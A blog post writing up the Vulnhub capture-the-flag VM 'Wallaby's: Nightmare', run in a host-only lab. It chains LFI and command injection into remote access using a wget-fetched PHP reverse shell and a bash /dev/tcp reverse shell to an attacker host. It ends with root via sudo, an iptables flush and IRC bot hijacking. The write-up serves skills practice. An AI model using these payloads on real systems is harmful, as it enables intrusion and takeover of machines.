---
layout:     post
title:      "Vulnhub.com - Wallaby's: Nightmare"
subtitle:   "Write-Up"
date:       2017-07-16 8:00:00
author:     "W3ndige"
header-img: "img/wallabys-nightmare-header.jpeg"
permalink: /:title/
category: Vulnhub
---
<h1>Introduction</h1>
<p>Today we're going to play with another machine called <b>Wallaby's: Nightmare</b>. Here's the description: </p>

{% highlight text %}
This is my first CTF/Vulnerable VM ever. I created it both for educational purposes and so people can have a little fun testing their skills in a legal, pentest lab environment.

Some notes before you download!

    Try to use a Host-Only Adapter. This is an intentionally vulnerable machine and leaving it open on your network can have bad results.
    It should work with Vmware flawlessly. I've tested it with vbox and had one other friend test it on Vbox as well so I think it should work just fine on anything else.

This is a Boot2Root machine. The goal is for you to attempt to attempt to gain root privileges in the VM. Do not try to get the root flag through a recovery iso etc, this is essentially cheating! The idea is to get through by pretending this machine is being attacked over a network with no physical access.

I themed this machine to make it feel a bit more realistic. You are breaking into a fictional characters server (named Wallaby) and trying to gain root without him noticing, or else the difficulty level will increase if you make the wrong move! Good luck and I hope you guys enjoy!
{% endhighlight %}

<h1>Challenge</h1>

<p>As always, we're going to start from finding an IP address of the machine using Nmap. </p>


{% highlight bash %}
root@kali:~# nmap 192.168.56.102/24

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-15 08:14 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.000062s latency).
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.00011s latency).
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:29:FD:0E (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.00056s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.102
Host is up (0.0000050s latency).
All 1000 scanned ports on 192.168.56.102 are closed

Nmap done: 256 IP addresses (4 hosts up) scanned in 6.10 seconds

{% endhighlight %}

<p>Now we can start the fun from looking at the http port, there's always something interesting in the website. </p>

![First Look](/img/wallabys-nightmare/first-look.png){:class="img-responsive center-block"}

<p>Hmmm, prompt asking us for a username. Let's enter something and see what happens. </p>

![Website - the inside](/img/wallabys-nightmare/website-inside.png){:class="img-responsive center-block"}

<p>As we can see it's a simple introducion to the ctf. As a standart part of checking everything, I have found XSS in the form, but it won't help us for now. We can start digging further by clicking on <b>start the ctf</b> link, which moves us to a new page. And what is good for us, is that it uses the GET parameter to display the file.  </p>

{% highlight html %}
http://192.168.56.101/?page=home
{% endhighlight %}

<p>Maybe it's vulnerable to Local File Intrusion? Let's check this by trying to get the content of <b>/etc/passwd</b> file. </p>

{% highlight html %}
http://192.168.56.101/?page=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash<!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here bobby
?-->
{% endhighlight %}

<p>Great, we have the <b>/etc/passwd</b> file. But after trying to grab <b>/etc/shadow</b>, website presented us this with this nice info and connection was dropped. </p>

{% highlight html %}

view-source:http://192.168.56.101/?page=../../../etc/shadow
<h2>That's some fishy stuff you're trying there <em>bobby
</em>buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...</h2>
         <br />(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)

{% endhighlight %}

<p>Doing the Nmap scan showed us that the port 80 is no longer there. </p>

{% highlight bash %}
root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-15 08:21 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.00019s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
{% endhighlight%}

<p>But another scan, with bigger port range, showed new http service, running on port <b>60080</b>. </p>

{% highlight bash %}

root@kali:~# nmap -p- 192.168.56.101

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-15 08:22 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.0055s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
6667/tcp  filtered irc
60080/tcp open     unknown
MAC Address: 08:00:27:BC:E8:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds

{% endhighlight %}

<p>Another website! </p>

![Port 60080 website](/img/wallabys-nightmare/another-website.png){:class="img-responsive center-block"}

<p>Unfortunately there were no clues in the image, as I thought at first. </p>

{% highlight bash %}

http://192.168.56.101:60080/sec.png

root@kali:~/Downloads# exiftool index.png
ExifTool Version Number         : 10.40
File Name                       : index.png
Directory                       : .
File Size                       : 56 kB
File Modification Date/Time     : 2017:07:15 08:24:56-04:00
File Access Date/Time           : 2017:07:15 08:25:17-04:00
File Inode Change Date/Time     : 2017:07:15 08:24:56-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 600
Image Height                    : 400
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Software                        : Adobe ImageReady
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:04130E655CDC11E08DFECD5B48C7E53A
Document ID                     : xmp.did:04130E665CDC11E08DFECD5B48C7E53A
Derived From Instance ID        : xmp.iid:04130E635CDC11E08DFECD5B48C7E53A
Derived From Document ID        : xmp.did:04130E645CDC11E08DFECD5B48C7E53A
Image Size                      : 600x400
Megapixels                      : 0.240

{% endhighlight %}

<p>If you don't know what to do, do a Nikto scan! </p>

{% highlight bash %}

root@kali:~# nikto -h 192.168.56.101:60080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        60080
+ Start Time:         2017-07-15 08:28:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7537 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2017-07-15 08:29:23 (GMT-4) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

{% endhighlight %}

<p>Hey, it's the same vulnerability as in the previous page. Let's exploit it once again. </p>

{% highlight html %}
http://192.168.56.101:60080/index.php?page=index.php

<h2>Dude, <em>bobby</em> what are you trying over here?!</h2>
{% endhighlight %}

<p>I'm running a dirbuster! </p>

{% highlight bash %}

root@kali:~# dirb http://192.168.56.101:60080/?page= /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul 15 08:36:59 2017
URL_BASE: http://192.168.56.101:60080/?page=
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.56.101:60080/?page= ----
+ http://192.168.56.101:60080/?page=blacklist (CODE:200|SIZE:992)              
+ http://192.168.56.101:60080/?page=cgi-bin/ (CODE:200|SIZE:898)               
+ http://192.168.56.101:60080/?page=contact (CODE:200|SIZE:895)                
+ http://192.168.56.101:60080/?page=home (CODE:200|SIZE:1145)                  
+ http://192.168.56.101:60080/?page=index (CODE:200|SIZE:1360)                 
+ http://192.168.56.101:60080/?page=mailer (CODE:200|SIZE:1083)                
                                                                               
-----------------
END_TIME: Sat Jul 15 08:37:24 2017
DOWNLOADED: 20458 - FOUND: 6

{% endhighlight %}

<p>We can now manually go through these pages to look for anything interesting. There's nothing in the contact...</p>

{% highlight bash %}
http://192.168.56.101:60080/index.php?page=contact

Contact me with all your whining at wallaby@wallaby.wallaby.
{% endhighlight %}

<p>But mailer, mailer is interesting. </p>

{% highlight html %}

http://192.168.56.101:60080/index.php?page=mailer

<h2 style='color:blue;'>Coming Soon guys!</h2>
    <!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so bobby can send me all his loser complaints!-->

{% endhighlight %}

<p>And by trial and error, I've found that it's even vulnerable to command injection. Let's check that! </p>

{% highlight html %}
http://192.168.56.101:60080/?page=mailer&mail=uname%20-a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

<p>Our plan is to upload a <b>PHP Reverse Shell</b> to the machine. Firstly, let's copy it, so then we can modify the code. </p>  

{% highlight bash %}
root@kali:~/web# cp /usr/share/webshells/php/php-reverse-shell.php ~/web
{% endhighlight %}

{% highlight php %}
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.102';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
?>
{% endhighlight %}

<p>Now, we're ready to upload the file on Python SimpleHTTPServer. </p>

{% highlight bash%}
root@kali:~/web# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
{% endhighlight %}

<p>And we can use <b>wget</b> to download the shell on our victim machine. </p>

{% highlight bash %}
http://192.168.56.101:60080/?page=mailer&mail=wget%20192.168.56.102:8000/shell.php
http://192.168.56.101:60080/?page=mailer&mail=ls

eye.jpg index.php s13!34g$3FVA5e@ed sec.png shell.php uname.txt 
{% endhighlight %}

<p>Now start the netcat listener and navigate to the shell.php file. </p>

{% highlight bash %}
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 59808
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 08:07:00 up 53 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
waldo    pts/0    tmux(642).%0     07:13   53:39   0.64s  0.64s irssi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$

{% endhighlight %}

<p>And we're connected! Running <b>sudo -l</b> gives us information that we can run <b>iptables</b> as <b>www-data</b> and <b>vim</b> with certain file as <b>waldo</b> user. </p>

{% highlight bash %}
www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
{% endhighlight %}

<p>Remember that <b>IRC</b> port that came up during the first scan? It was filtered, so flushing the iptables may allow us to connect. </p>

{% highlight bash %}
www-data@ubuntu:/$ sudo iptables -F
sudo iptables -F
{% endhighlight %}

<p>Now, let's check that by running another Nmap scan. </p>

{% highlight bash %}
root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-15 11:32 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
6667/tcp open  irc
MAC Address: 08:00:27:BC:E8:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
{% endhighlight %}

<p>Great, it's open! Let's connect to it using <b>HexChat</b>. </p>

![First look at IRC](/img/wallabys-nightmare/irc-first-look.png){:class="img-responsive center-block"}

<p>List of commands, let's take a look at them! </p>

![IRC commands](/img/wallabys-nightmare/irc-commands.png){:class="img-responsive center-block"}

<p>Best option to gain his identity, would be kicking him from the chat. But how? Firstly we can take a look at the current processes running as waldo user. </p>

{% highlight bash %}
www-data@ubuntu:/$ ps -aux | grep waldo
ps -aux | grep waldo
waldo      642  0.0  0.2  29416  3024 ?        Ss   07:13   0:00 tmux new-session -d -s irssi
waldo      687  0.0  0.0   4508   784 pts/0    Ss   07:13   0:00 -sh
waldo      733  0.0  0.8 115744  8484 pts/0    Sl+  07:13   0:01 irssi
www-data  1414  0.0  0.0  11284   944 pts/1    S+   08:43   0:00 grep waldo
{% endhighlight %}
<p>Let's remember the number of irssi process - 773. Now we can use vim to kill the process. </p>

{% highlight bash %}
www-data@ubuntu:/$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
<waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf            

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'

:!kill 733st *:60080>
        # The ServerName directive sets the request scheme, hostname and port th
at
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
:!kill 733
{% endhighlight %}

<p>Great, a few moments later we can see that waldo has quit. We can now quickly change our name to his using <b>/nick waldo</b> command, and fortunately, we'll be able to execute <b>.run</b> command. </p>
{% highlight bash %}
* waldo has quit (Client exited)
* You are now known as waldo
<waldo> .run whoami
<wallabysbot> b'wallaby'
{% endhighlight %}

<p>Firstly let's start the listener on port 8080. Now let's enter this useful trick, which will provide us with a shell. </p>

{% highlight bash %}
<waldo> .run bash -c "bash -i >& /dev/tcp/192.168.56.102/8080 0>&1"
{% endhighlight %}
{% highlight bash %}
root@kali:~# nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 57524
bash: cannot set terminal process group (624): Inappropriate ioctl for device
bash: no job control in this shell
wallaby@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for wallaby on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wallaby may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL 
{% endhighlight %}

<p>In addition we can freely use sudo. Amazing! </p>

{% highlight bash %}
wallaby@ubuntu:~$ sudo su
sudo su
whoami
root
ls
www
ls -la
total 52
drwxr-xr-x 8 wallaby wallaby 4096 Dec 16  2016 .
drwxr-xr-x 5 root    root    4096 Dec 16  2016 ..
-rw------- 1 wallaby wallaby    1 Dec 30  2016 .bash_history
-rw-r--r-- 1 wallaby wallaby  220 Dec 16  2016 .bash_logout
-rw-r--r-- 1 wallaby wallaby 3771 Dec 16  2016 .bashrc
drwx------ 3 wallaby wallaby 4096 Dec 16  2016 .cache
drwx------ 2 wallaby wallaby 4096 Dec 16  2016 .irssi
drwx------ 4 wallaby wallaby 4096 Dec 16  2016 .local
drwxrwxr-x 2 wallaby wallaby 4096 Dec 16  2016 .nano
-rw-r--r-- 1 wallaby wallaby  655 Dec 16  2016 .profile
-rw-rw-r-- 1 wallaby wallaby   66 Dec 16  2016 .selected_editor
drwxrwxr-x 4 wallaby wallaby 4096 Dec 30  2016 .sopel
-rw-r--r-- 1 wallaby wallaby    0 Dec 16  2016 .sudo_as_admin_successful
drwxrwxr-x 3 wallaby wallaby 4096 Dec 16  2016 www
cd /root
ls -la
total 48
drwx------  4 root root 4096 Dec 27  2016 .
drwxr-xr-x 22 root root 4096 Dec 14  2016 ..
drwxr-xr-x  2 root root 4096 Dec 27  2016 backups
-rw-------  1 root root    1 Dec 27  2016 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  510 Dec 27  2016 check_level.sh
-rw-r--r--  1 root root  342 Dec 16  2016 flag.txt
-rw-------  1 root root   18 Dec 15  2016 .mysql_history
drwxr-xr-x  2 root root 4096 Dec 15  2016 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec 15  2016 .selected_editor
-rw-r--r--  1 root root  214 Dec 16  2016 .wget-hsts
cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
{% endhighlight %}

<p>Here we have the final flag, and the game is over. It was anothers great and educational machine from <a href="https://www.vulnhub.com">Vulnhub</a>. Thanks <a href="https://www.arashparsa.com/">Waldo</a>!</p>

